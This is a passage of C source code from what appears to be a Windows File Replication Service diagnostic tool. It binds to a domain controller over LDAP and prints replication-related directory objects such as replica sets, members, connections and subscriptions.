        ldap = ldap_init(DcAddr + 2, LDAP_PORT);
        if (!ldap) {
//            fprintf(stderr, "WARN - ldap_open(DcAddr + 2 %ws); WStatus %d\n",
//                    DcAddr + 2,
//                    WStatus);
            fprintf(stderr, "WARN - ldap_init(DcAddr + 2 %ws); WStatus %d\n",
                    DcAddr + 2,
                    WStatus);
        } else {
//            printf("ldap_open(DcAddr + 2 %ws) succeeded\n", DcAddr + 2);
            printf("ldap_init(DcAddr + 2 %ws) succeeded\n", DcAddr + 2);
        }
    }

    //
    // DC's DNS name
    //
    if (!ldap && DcDnsName) {
//        ldap = ldap_open(DcDnsName, LDAP_PORT);
        ldap = ldap_init(DcDnsName, LDAP_PORT);
        if (!ldap) {
//            fprintf(stderr, "WARN - ldap_open(DcDnsName %ws); WStatus %d\n",
//                    DcDnsName,
//                    WStatus);
            fprintf(stderr, "WARN - ldap_init(DcDnsName %ws); WStatus %d\n",
                    DcDnsName,
                    WStatus);
        } else {
//            printf("ldap_open(DcDnsName %ws) succeeded\n", DcDnsName);
            printf("ldap_init(DcDnsName %ws) succeeded\n", DcDnsName);
        }
    }

    //
    // DC's IP Address
    //
    if (!ldap && DcAddr) {
//        ldap = ldap_open(DcAddr, LDAP_PORT);
        ldap = ldap_init(DcAddr, LDAP_PORT);
        if (!ldap) {
//            fprintf(stderr, "WARN - ldap_open(DcAddr %ws); WStatus %d\n",
//                    DcAddr,
//                    WStatus);
            fprintf(stderr, "WARN - ldap_init(DcAddr %ws); WStatus %d\n",
                    DcAddr,
                    WStatus);
        } else {
//            printf("ldap_open(DcAddr %ws) succeeded\n", DcAddr);
            printf("ldap_init(DcAddr %ws) succeeded\n", DcAddr);
        }
    }

    //
    // Whatever it is, we can't find it.
    //
    if (!ldap) {
//        fprintf(stderr, "ERROR - ldap_open(DNS %ws, IP %ws); WStatus %d\n",
//                DcDnsName,
//                DcAddr,
//                WStatus);
        fprintf(stderr, "ERROR - ldap_init(DNS %ws, IP %ws); WStatus %d\n",
                DcDnsName,
                DcAddr,
                WStatus);
        return NULL;
    }

    //
    // set the option as explained in the comment above.
    //
    ulOptions = PtrToUlong(LDAP_OPT_ON);
    ldap_set_option(ldap, LDAP_OPT_AREC_EXCLUSIVE, &ulOptions);

    //
    // ldap cannot be used until after the bind operation
    //
    WStatus = ldap_bind_s(ldap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (WStatus != LDAP_SUCCESS) {
        fprintf(stderr, "ERROR - ldap_bind_s: %ws\n", ldap_err2string(WStatus));
        ldap_unbind(ldap);
        return NULL;
    }

    return ldap;
}


PWCHAR *
GetValues(
    IN PLDAP  Ldap,
    IN PWCHAR Dn,
    IN PWCHAR DesiredAttr,
    IN BOOL   Quiet
    )
/*++
Routine Description:
    Return the DS values for one attribute in an object.

Arguments:
    ldap        - An open, bound ldap port.
    Base        - The "pathname" of a DS object.
    DesiredAttr - Return values for this attribute.
    Quiet

Return Value:
    An array of char pointers that represents the values for the attribute.
    The caller must free the array with ldap_value_free(). NULL if unsuccessful.
--*/
{
    PWCHAR          Attr;
    BerElement      *Ber;
    PLDAPMessage    LdapMsg;
    PLDAPMessage    LdapEntry;
    PWCHAR          Attrs[2];
    PWCHAR          *Values = NULL;

    //
    // Search Base for all of its attributes + values
    //
    Attrs[0] = DesiredAttr;
    Attrs[1] = NULL;

    //
    // Issue the ldap search
    //
    if (!LdapSearch(Ldap, Dn, LDAP_SCOPE_BASE, CATEGORY_ANY,
                    Attrs, 0, &LdapMsg, Quiet)) {
        return NULL;
    }
    LdapEntry = ldap_first_entry(Ldap, LdapMsg);
    if (LdapEntry) {
        Attr = ldap_first_attribute(Ldap, LdapEntry, &Ber);
        if (Attr) {
            Values = ldap_get_values(Ldap, LdapEntry, Attr);
        }
    }
    ldap_msgfree(LdapMsg);
    return Values;
}


VOID
GuidToStr(
    IN GUID  *pGuid,
    OUT PWCHAR  s
    )
/*++
Routine Description:
    Convert a GUID to a string.

Arguments:
    pGuid - ptr to the GUID.
    s - The output character buffer.
        Must be at least GUID_CHAR_LEN (36 bytes) long.

Function Return Value:
    None.
--*/
{
    if (pGuid != NULL) {
        swprintf(s, L"%08x-%04x-%04x-%02x%02x%02x%02x%02x%02x%02x%02x",
               pGuid->Data1,
               pGuid->Data2,
               pGuid->Data3,
               pGuid->Data4[0],
               pGuid->Data4[1],
               pGuid->Data4[2],
               pGuid->Data4[3],
               pGuid->Data4[4],
               pGuid->Data4[5],
               pGuid->Data4[6],
               pGuid->Data4[7]);
    } else {
        swprintf(s, L"<null>");
    }
}


PWCHAR
GetRootDn(
    IN PLDAP    Ldap,
    IN PWCHAR   NamingContext
    )
/*++
Routine Description:

Arguments:

Return Value:
--*/
{
    PWCHAR  Root;       // DS pathname of configuration container
    PWCHAR  *Values;    // values from the attribute "namingContexts"
    DWORD   NumVals;    // number of values

    //
    // Return all of the values for the attribute namingContexts
    //
    Values = GetValues(Ldap, CN_ROOT, ATTR_NAMING_CONTEXTS, FALSE);
    if (Values == NULL)
        return NULL;

    //
    // Find the naming context that begins with CN=Configuration
    //
    NumVals = ldap_count_values(Values);
    while (NumVals--) {
        _wcslwr(Values[NumVals]);
        Root = wcsstr(Values[NumVals], NamingContext);
        if (Root != NULL && Root == Values[NumVals]) {
            Root = FrsWcsDup(Root);
            ldap_value_free(Values);
            return Root;
        }
    }
    printf("ERROR - COULD NOT FIND %ws\n", NamingContext);
    ldap_value_free(Values);
    return NULL;
}


PWCHAR
ExtendDn(
    IN PWCHAR Dn,
    IN PWCHAR Cn
    )
/*++
Routine Description:
    Extend an existing DN with a new CN= component.

Arguments:
    Dn  - distinguished name
    Cn  - common name

Return Value:
    CN=Cn,Dn
--*/
{
    ULONG  Len;
    PWCHAR NewDn;

    if (!Dn || !Cn) {
        return NULL;
    }

    Len = wcslen(L"CN=,") + wcslen(Dn) + wcslen(Cn) + 1;
    NewDn = (PWCHAR)malloc(Len * sizeof(WCHAR));
    wcscpy(NewDn, L"CN=");
    wcscat(NewDn, Cn);
    wcscat(NewDn, L",");
    wcscat(NewDn, Dn);
    return NewDn;
}


PVOID *
FindValues(
    IN PLDAP        Ldap,
    IN PLDAPMessage LdapEntry,
    IN PWCHAR       DesiredAttr,
    IN BOOL         DoBerValues
    )
/*++
Routine Description:
    Return the DS values for one attribute in an entry.

Arguments:
    Ldap        - An open, bound ldap port.
    LdapEntry   - An ldap entry returned by ldap_search_s()
    DesiredAttr - Return values for this attribute.
    DoVerValues - Return the bervals

Return Value:
    An array of char pointers that represents the values for the attribute.
    The caller must free the array with ldap_value_free(). NULL if unsuccessful.
--*/
{
    PWCHAR      LdapAttr;       // Retrieved from an ldap entry
    BerElement  *Ber;       // Needed for scanning attributes

    //
    // Search the entry for the desired attribute
    //
    for (LdapAttr = ldap_first_attribute(Ldap, LdapEntry, &Ber);
         LdapAttr != NULL;
         LdapAttr = ldap_next_attribute(Ldap, LdapEntry, Ber)) {
        if (_wcsicmp(DesiredAttr, LdapAttr) == 0) {
            //
            // Return the values for DesiredAttr
            //
            if (DoBerValues) {
                return (PVOID *)ldap_get_values_len(Ldap, LdapEntry, LdapAttr);
            } else {
                return (PVOID *)ldap_get_values(Ldap, LdapEntry, LdapAttr);
            }
        }
    }
    return NULL;
}


PWCHAR
FindValue(
    IN PLDAP        Ldap,
    IN PLDAPMessage LdapEntry,
    IN PWCHAR       DesiredAttr
    )
/*++
Routine Description:
    Return a copy of the first DS value for one attribute in an entry.

Arguments:
    Ldap        - An open, bound ldap port.
    LdapEntry   - An ldap entry returned by ldap_search_s()
    DesiredAttr - Return values for this attribute.

Return Value:
    A zero-terminated string or NULL if the attribute or its value
    doesn't exist. The string is freed with FREE_NO_HEADER().
--*/
{
    PWCHAR  Val;
    PWCHAR  *Values;

    // Get ldap's array of values
    Values = (PWCHAR *)FindValues(Ldap, LdapEntry, DesiredAttr, FALSE);

    // Copy the first value (if any)
    Val = (Values) ? FrsWcsDup(Values[0]) : NULL;

    // Free ldap's array of values
    ldap_value_free(Values);

    return Val;
}


BOOL
FindBerValue(
    IN  PLDAP        ldap,
    IN  PLDAPMessage Entry,
    IN  PWCHAR       DesiredAttr,
    OUT ULONG        *Len,
    OUT VOID         **Value
    )
/*++
Routine Description:
    Return a copy of the attributes object's schedule

Arguments:
    ldap        - An open, bound ldap port.
    Entry       - An ldap entry returned by ldap_search_s()
    DesiredAttr - desired attribute
    Len         - length of Value
    Value       - binary value

Return Value:
    The address of a schedule or NULL. Free with FrsFree().
--*/
{
    PLDAP_BERVAL    *Values;
    PSCHEDULE       Schedule;

    *Len = 0;
    *Value = NULL;

    //
    // Get ldap's array of values
    //
    Values = (PLDAP_BERVAL *)FindValues(ldap, Entry, DesiredAttr, TRUE);
    if (!Values) {
        return FALSE;
    }

    //
    // Return a copy of the schedule
    //
    *Len = Values[0]->bv_len;
    if (*Len) {
        *Value = (PWCHAR)malloc(*Len);
        CopyMemory(*Value, Values[0]->bv_val, *Len);
    }
    ldap_value_free_len(Values);
    return TRUE;
}


VOID
DumpValues(
    IN PLDAP    Ldap,
    IN PWCHAR   Dn,
    IN DWORD    Scope,
    IN PWCHAR   Class,
    IN PWCHAR   Attrs[],
    IN BOOL     IfEmpty
    )
/*++
Routine Description:
    Print the values and attributes for an object in the DS.

Arguments:
    ldap    - An open, bound ldap port.
    Base    - The "pathname" of a DS object.
    Scope   - Dump the values about the object (LDAP_SCOPE_BASE) or
              about the objects contained in this object (LDAP_SCOPE_ONELEVEL)

Return Value:
    None.
--*/
{
    PWCHAR          Attr;       // Retrieved from an ldap entry
    BerElement      *Ber;       // Needed for scanning attributes
    PLDAPMessage    Msg;        // Opaque stuff from ldap subsystem
    PLDAPMessage    Entry;      // Opaque stuff from ldap subsystem
    PWCHAR          *Values;    // Array of values for desired attribute
    PLDAP_BERVAL    *Balues;    // Array of values for desired attribute
    DWORD           NumVals;    // Number of entries in Values
    PWCHAR          Rdn;        // An entries "pathname" in the DS
    WCHAR           GuidStr[GUID_CHAR_LEN + 1];
    PWCHAR          EntryDn;
    ULONG           i;

    //
    // Search Base for all of the attributes + values of Class
    //
    if (!LdapSearch(Ldap, Dn,  Scope, Class,
                    Attrs, 0, &Msg, !IfEmpty)) {
        return;
    }

    //
    // Scan the entries returned from ldap_search
    //
    for (Entry = ldap_first_entry(Ldap, Msg);
         Entry != NULL;
         Entry = ldap_next_entry(Ldap, Entry)) {

        EntryDn = FindValue(Ldap, Entry, ATTR_DN);
        if (EntryDn) {
            Attr = ldap_first_attribute(Ldap, Entry, &Ber);
            if (Attr) {
                Attr = ldap_next_attribute(Ldap, Entry, Ber);
            }
            if (!IfEmpty && !Attr) {
                continue;
            }
            Rdn = MakeRdn(EntryDn);
            printf("%ws\n", Rdn);
            FREE(EntryDn);
            FREE(Rdn);
        } else {
            Attr = ldap_first_attribute(Ldap, Entry, &Ber);
            if (!IfEmpty && !Attr) {
                continue;
            }
            printf("Entry has no distinguished name\n");
        }

        //
        // Scan the attributes of an entry
        //
        for (Attr = ldap_first_attribute(Ldap, Entry, &Ber);
             Attr != NULL;
             Attr = ldap_next_attribute(Ldap, Entry, Ber)) {

            //
            // Printed above; don't repeat
            //
            if (!wcscmp(Attr, ATTR_DN)) {
                continue;
            }

            //
            // Print the values
            //
            printf("    %ws\n", Attr);

            for (i = 0; GuidAttrs[i]; ++i) {
                if (!wcscmp(Attr, GuidAttrs[i])) {
                    Balues = ldap_get_values_len(Ldap, Entry, Attr);
                    NumVals = ldap_count_values_len(Balues);
                    if (NumVals) {
                        GuidToStr((GUID *)Balues[0]->bv_val, GuidStr);
                        printf("        Length %d; %ws\n",
                               Balues[0]->bv_len, GuidStr);
                    }
                    ldap_value_free_len(Balues);
                    break;
                }
            }
            if (GuidAttrs[i]) {
                continue;
            }
            for (i = 0; BerAttrs[i]; ++i) {
                if (!wcscmp(Attr, BerAttrs[i])) {
                    Balues = ldap_get_values_len(Ldap, Entry, Attr);
                    NumVals = ldap_count_values_len(Balues);
                    if (NumVals) {
                        printf("        Length %d\n",
                               Balues[0]->bv_len);
                    }
                    ldap_value_free_len(Balues);
                    break;
                }
            }
            if (BerAttrs[i]) {
                continue;
            }

            if (!wcscmp(Attr, L"schedule")) {
                Balues = ldap_get_values_len(Ldap, Entry, Attr);
                NumVals = ldap_count_values_len(Balues);
                if (NumVals) {
                    printf("        Length %d; Number %d\n",
                           NumVals,
                           Balues[0]->bv_len,
                           ((PSCHEDULE)(Balues[0]->bv_val))->NumberOfSchedules);
                }
                ldap_value_free_len(Balues);
                continue;
            }
            Values = ldap_get_values(Ldap, Entry, Attr);
            NumVals = ldap_count_values(Values);
            while (NumVals--) {
                printf("        %ws\n", Values[NumVals]);
            }
            ldap_value_free(Values);
        }
    }
    ldap_msgfree(Msg);
}


DWORD
GetDnsName(
    IN  PWCHAR Server,
    OUT PWCHAR *DnsName
    )
/*++
Routine Description:
    Retrieve this machine's DNS name.

Arguments:
    Server
    DnsName - wide char version of dns name

Return Value:
    WSA Status
--*/
{
    INT             SStatus;
    WORD            DnsVersion = MAKEWORD(1, 1);
    struct hostent  *Host;
    WSADATA         WSAData;
    PCHAR           DnsNameA;
    PCHAR           ServerA;

    *DnsName = NULL;

    //
    // Get this machine's DNS name
    //

    //
    // Initialize the socket subsystem
    //
    if (SStatus = WSAStartup(DnsVersion, &WSAData)) {
        fprintf(stderr, "Can't get DNS name; Socket startup error %d\n",
                SStatus);
        return SStatus;
    };
    //
    // Get the DNS name
    //
    ServerA = FrsWtoA(Server);
    Host = gethostbyname(ServerA);
    FREE(ServerA);
    if (Host == NULL) {
        SStatus = WSAGetLastError();
        fprintf(stderr, "Can't get DNS name for %ws; gethostbyname error %d\n",
                Server, SStatus);
        return SStatus;
    }
    if (Host->h_name == NULL) {
        fprintf(stderr, "DNS name for %ws is NULL\n", Server);
        return WSAEFAULT;
    }
    //
    // Return both the ASCII and UNICODE versions
    //
    *DnsName = FrsAtoW(Host->h_name);
    WSACleanup();
    return 0;
}


PWCHAR
GetNextDn(
    IN PLDAP     Ldap,
    PLDAPMessage LdapEntry,
    IN PWCHAR    ParentDn
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR      Cn          = NULL;
    PWCHAR      Dn          = NULL;

    Cn = FindValue(Ldap, LdapEntry, ATTR_CN);
    if (Cn) {
        Dn = ExtendDn(ParentDn, Cn);
        FREE(Cn)
    }
    return Dn;
}


PWCHAR
DumpAttrs(
    IN PLDAP     Ldap,
    PLDAPMessage LdapEntry,
    IN PWCHAR    ParentDn,
    IN PWCHAR    *Attrs,
    IN PWCHAR    Indent
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    DWORD       NumVals;
    ULONG       ScheduleLen;
    ULONG       ExtensionsLen;
    PSCHEDULE   Schedule    = NULL;
    PCHAR       Extensions  = NULL;
    PWCHAR      Val         = NULL;
    PWCHAR      Rdn         = NULL;
    PWCHAR      Pdn         = NULL;
    PWCHAR      PRdn        = NULL;
    PWCHAR      *Values     = NULL;

    if (!Attrs) {
        return NULL;
    }

    while (*Attrs) {
        //
        // Don't bother, the Cn will do
        //
        if (!wcscmp(*Attrs, ATTR_DN)) {
            ++Attrs;
            continue;
        }
        if (!wcscmp(*Attrs, ATTR_COMPUTER_REF_BL)) {
            Values = ldap_get_values(Ldap, LdapEntry, *Attrs);
            NumVals = ldap_count_values(Values);
            while (NumVals--) {
                Rdn = MakeRdn(Values[NumVals]);
                Pdn = FrsDsMakeParentDn(Values[NumVals]);
                PRdn = MakeRdn(Pdn);
                printf("    %ws%ws=%ws\\%ws\n", Indent, *Attrs, PRdn, Rdn);
                FREE(Rdn);
                FREE(Pdn);
                FREE(PRdn);
            }
            ldap_value_free(Values);
        } else if (!wcscmp(*Attrs, ATTR_SCHEDULE)) {
            FindBerValue(Ldap,
                         LdapEntry,
                         ATTR_SCHEDULE,
                         &ScheduleLen,
                         (VOID **)&Schedule);
            if (Schedule) {
                // PrintShortSchedule(Indent, Schedule, ScheduleLen);
                PrintLongSchedule(L"    ", Indent, Schedule, ScheduleLen);
                FREE(Schedule);
            } else {
                printf("    %wsSchedule=\n", Indent);
            }
        } else if (!wcscmp(*Attrs, ATTR_EXTENSIONS)) {
            FindBerValue(Ldap,
                         LdapEntry,
                         ATTR_EXTENSIONS,
                         &ExtensionsLen,
                         (VOID **)&Extensions);
            if (Extensions) {
                FREE(Extensions);
                printf("    %wsExtensions=%d\n", Indent, ExtensionsLen);
            } else {
                printf("    %wsExtensions=\n", Indent);
            }
        } else if (!wcscmp(*Attrs, ATTR_NAMING_CONTEXTS)) {
            Values = ldap_get_values(Ldap, LdapEntry, *Attrs);
            NumVals = ldap_count_values(Values);
            while (NumVals--) {
                printf("    %ws%ws=%ws\n", Indent, *Attrs, Values[NumVals]);
            }
            ldap_value_free(Values);
        } else {
            Val = FindValue(Ldap, LdapEntry, *Attrs);
            if (Val) {
                if (!wcscmp(*Attrs, ATTR_CN)) {
                    printf("%ws%ws\n", Indent, Val);
                } else if (!wcscmp(*Attrs, ATTR_FROM_SERVER)     ||
                           !wcscmp(*Attrs, ATTR_PRIMARY_MEMBER)  ||
                           !wcscmp(*Attrs, ATTR_COMPUTER_REF)    ||
                           !wcscmp(*Attrs, ATTR_COMPUTER_REF_BL) ||
                           !wcscmp(*Attrs, ATTR_MEMBER_REF)      ||
                           !wcscmp(*Attrs, ATTR_MEMBER_REF_BL)   ||
                           !wcscmp(*Attrs, ATTR_SERVER_REF_BL)   ||
                           !wcscmp(*Attrs, ATTR_SERVER_REF)) {
                    Rdn = MakeRdn(Val);
                    Pdn = FrsDsMakeParentDn(Val);
                    PRdn = MakeRdn(Pdn);
                    printf("    %ws%ws=%ws\\%ws\n", Indent, *Attrs, PRdn, Rdn);
                    FREE(Rdn);
                    FREE(Pdn);
                    FREE(PRdn);
                } else {
                    printf("    %ws%ws=%ws\n", Indent, *Attrs, Val);
                }
                FREE(Val);
            } else {
                printf("    %ws%ws=\n", Indent, *Attrs);
            }
        }
        ++Attrs;
    }
    return GetNextDn(Ldap, LdapEntry, ParentDn);
}


VOID
DumpCxtions(
    IN PLDAP    Ldap,
    IN PWCHAR   ParentDn
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PWCHAR          NextDn              = NULL;

    //
    // Cxtions
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = ATTR_FROM_SERVER;
    DesiredAttrs[2] = ATTR_SCHEDULE;
    DesiredAttrs[3] = ATTR_ENABLED_CXTION;
    DesiredAttrs[4] = NULL;
    if (LdapSearch(Ldap, ParentDn, LDAP_SCOPE_ONELEVEL, CATEGORY_CXTION,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = DumpAttrs(Ldap, LdapEntry, ParentDn, DesiredAttrs, L"            ");
            if (NextDn) {
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
}


VOID
DumpMembers(
    IN PLDAP    Ldap,
    IN PWCHAR   ParentDn
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PWCHAR          NextDn              = NULL;

    //
    // Servers
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = ATTR_COMPUTER_REF;
    DesiredAttrs[2] = ATTR_MEMBER_REF_BL;
    DesiredAttrs[3] = ATTR_SERVER_REF;
    DesiredAttrs[4] = NULL;
    // DesiredAttrs[4] = ATTR_CONTROL_CREATION;
    // DesiredAttrs[5] = ATTR_INBOUND_BACKLOG;
    // DesiredAttrs[6] = ATTR_OUTBOUND_BACKLOG;
    // DesiredAttrs[7] = ATTR_SERVICE_COMMAND;
    // DesiredAttrs[8] = ATTR_UPDATE_TIMEOUT;
    // DesiredAttrs[9] = ATTR_EXTENSIONS;
    // DesiredAttrs[10] = ATTR_FLAGS;
    // DesiredAttrs[11] = ATTR_AUTH_LEVEL;
    DesiredAttrs[12] = NULL;
    if (LdapSearch(Ldap, ParentDn,  LDAP_SCOPE_ONELEVEL, CATEGORY_MEMBER,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = DumpAttrs(Ldap, LdapEntry, ParentDn, DesiredAttrs, L"        ");
            if (NextDn) {
                DumpCxtions(Ldap, NextDn);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
}


VOID
DumpSets(
    IN PLDAP    Ldap,
    IN PWCHAR   ParentDn
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PWCHAR          NextDn              = NULL;

    //
    // Sets
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = ATTR_PRIMARY_MEMBER;
    DesiredAttrs[2] = ATTR_SET_TYPE;
    DesiredAttrs[3] = ATTR_SCHEDULE;
    DesiredAttrs[4] = ATTR_DIRECTORY_FILTER;
    DesiredAttrs[5] = ATTR_FILE_FILTER;
    DesiredAttrs[6] = NULL;
    // DesiredAttrs[7] = ATTR_DS_POLL;
    // DesiredAttrs[8] = ATTR_EXTENSIONS;
    // DesiredAttrs[9] = ATTR_FLAGS;
    // DesiredAttrs[10] = ATTR_LEVEL_LIMIT;
    // DesiredAttrs[11] = ATTR_AUTH_LEVEL;
    DesiredAttrs[12] = NULL;
    if (LdapSearch(Ldap, ParentDn, LDAP_SCOPE_ONELEVEL, CATEGORY_REPLICA_SET,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = DumpAttrs(Ldap, LdapEntry, ParentDn, DesiredAttrs, L"    ");
            if (NextDn) {
                DumpMembers(Ldap, NextDn);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
}


VOID
DumpContexts(
    IN PLDAP Ldap
    )
/*++
Routine Description:
    Dump every ds object related to replication

Arguments:
    Ldap

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PWCHAR          NextDn              = NULL;
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;

    //
    // Setting
    //
    DesiredAttrs[0] = ATTR_NAMING_CONTEXTS;
    DesiredAttrs[1] = ATTR_DEFAULT_NAMING_CONTEXT;
    DesiredAttrs[2] = NULL;
    if (LdapSearch(Ldap, CN_ROOT, LDAP_SCOPE_BASE, CATEGORY_ANY,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = DumpAttrs(Ldap, LdapEntry, CN_ROOT, DesiredAttrs, L"");
            if (NextDn) {
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
}


VOID
DumpAdminWorld(
    IN PLDAP Ldap
    )
/*++
Routine Description:
    Dump every ds object related to replication

Arguments:
    Ldap

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PWCHAR          ConfigDn            = NULL;
    PWCHAR          ServicesDn          = NULL;
    PWCHAR          NextDn              = NULL;
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;

    //
    // Services
    //
    ConfigDn = GetRootDn(Ldap, CONFIG_NAMING_CONTEXT);
    if (!ConfigDn) {
        return;
    }
    ServicesDn = ExtendDn(ConfigDn, CN_SERVICES);

    //
    // Setting
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = NULL;
    // DesiredAttrs[1] = ATTR_EXTENSIONS;
    DesiredAttrs[2] = NULL;
    if (LdapSearch(Ldap, ServicesDn, LDAP_SCOPE_ONELEVEL, CATEGORY_NTFRS_SETTINGS,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = DumpAttrs(Ldap, LdapEntry, ServicesDn, DesiredAttrs, L"");
            if (NextDn) {
                DumpSets(Ldap, NextDn);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }

    FREE(ServicesDn);
    FREE(ConfigDn);
}


VOID
DumpSubscribers(
    IN PLDAP    Ldap,
    IN PWCHAR   ParentDn
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PWCHAR          NextDn              = NULL;

    //
    // Subscribers
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = ATTR_REPLICA_ROOT;
    DesiredAttrs[2] = ATTR_REPLICA_STAGE;
    DesiredAttrs[3] = ATTR_MEMBER_REF;
    DesiredAttrs[4] = ATTR_SCHEDULE;
    DesiredAttrs[5] = NULL;
    // DesiredAttrs[4] = ATTR_EXTENSIONS;
    // DesiredAttrs[5] = ATTR_FAULT_CONDITION;
    // DesiredAttrs[6] = ATTR_FLAGS;
    // DesiredAttrs[7] = ATTR_SERVICE_COMMAND;
    // DesiredAttrs[8] = ATTR_SERVICE_COMMAND_STATUS;
    // DesiredAttrs[9] = ATTR_UPDATE_TIMEOUT;
    DesiredAttrs[10] = NULL;
    if (LdapSearch(Ldap, ParentDn, LDAP_SCOPE_ONELEVEL, CATEGORY_SUBSCRIBER,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = DumpAttrs(Ldap, LdapEntry, ParentDn, DesiredAttrs, L"            ");
            if (NextDn) {
                DumpSubscribers(Ldap, NextDn);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
}


VOID
DumpSubscriptions(
    IN PLDAP    Ldap,
    IN PWCHAR   ParentDn
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PWCHAR          NextDn              = NULL;

    //
    // Servers
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = ATTR_WORKING;
    DesiredAttrs[2] = NULL;
    // DesiredAttrs[2] = ATTR_EXTENSIONS;
    // DesiredAttrs[3] = ATTR_VERSION;
    DesiredAttrs[4] = NULL;
    if (LdapSearch(Ldap, ParentDn, LDAP_SCOPE_ONELEVEL, CATEGORY_SUBSCRIPTIONS,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = DumpAttrs(Ldap, LdapEntry, ParentDn, DesiredAttrs, L"        ");
            if (NextDn) {
                DumpSubscribers(Ldap, NextDn);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
}


VOID
DumpUserWorld(
    IN PLDAP Ldap
    )
/*++
Routine Description:
    Dump every ds object related to replication

Arguments:
    Ldap

Return Value:
    None.
--*/
{
    DWORD           WStatus;
    PWCHAR          DesiredAttrs[16];
    DWORD           NumVals;
    PWCHAR          *Values             = NULL;
    PWCHAR          NextDn              = NULL;
    PWCHAR          DefaultDn           = NULL;
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    HANDLE          Handle              = NULL;
    DS_NAME_RESULT  *Cracked            = NULL;
    WCHAR           **Crackee;
    PDOMAIN_CONTROLLER_INFO DcInfo;

    //
    // Return all of the values for the attribute namingContexts
    //
    Values = GetValues(Ldap, CN_ROOT, ATTR_DEFAULT_NAMING_CONTEXT, TRUE);
    if (!Values) {
        fprintf(stderr, "ERROR - Can't find %ws in %ws\n",
                ATTR_DEFAULT_NAMING_CONTEXT,
                CN_ROOT);
        return;
    }
    DefaultDn = FrsWcsDup(Values[0]);
    ldap_value_free(Values);

    //
    // Get Info about a Primary Domain Controller (need the IP address)
    //
    WStatus = FrsDsGetDcInfo(&DcInfo,
                          DS_DIRECTORY_SERVICE_REQUIRED | // Flags
                          DS_WRITABLE_REQUIRED);
    //
    // Report the error and carry on
    //
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr, "ERROR - Could not get DC Info; WStatus %d\n",
                WStatus);
    } else {
